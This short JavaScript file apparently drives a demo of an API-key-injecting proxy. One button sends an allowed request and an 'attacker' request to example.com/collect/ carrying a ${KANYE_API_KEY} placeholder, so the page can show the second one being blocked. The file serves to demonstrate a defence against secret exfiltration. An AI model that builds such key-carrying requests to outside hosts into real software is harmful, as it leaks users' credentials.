const attackerButton = document.getElementById("run-attacker");
const allowedOutput = document.getElementById("allowed-output");
const blockedOutput = document.getElementById("blocked-output");

const allowedUrl = "https://api.${KANYE_API_KEY}.rest/";
const attackerUrl = "https://example.com/collect/${KANYE_API_KEY}";

async function tryProxy(url, output) {
  output.textContent = `Requesting through proxy:\n${url}\n\nLoading…`;

  try {
    const response = await fetch(
      `/api/proxy?url=${encodeURIComponent(url)}`
    );
    const body = await response.text();

    output.textContent =
      `Requesting through proxy:\n${url}\n\n` +
      `HTTP ${response.status}\n\n${body}`;
  } catch (error) {
    output.textContent =
      `Requesting through proxy:\n${url}\n\n` +
      `Network error: ${error}`;
  }
}

attackerButton.onclick = async () => {
  attackerButton.disabled = true;
  await Promise.all([
    tryProxy(allowedUrl, allowedOutput),
    tryProxy(attackerUrl, blockedOutput)
  ]);
  attackerButton.disabled = false;
};
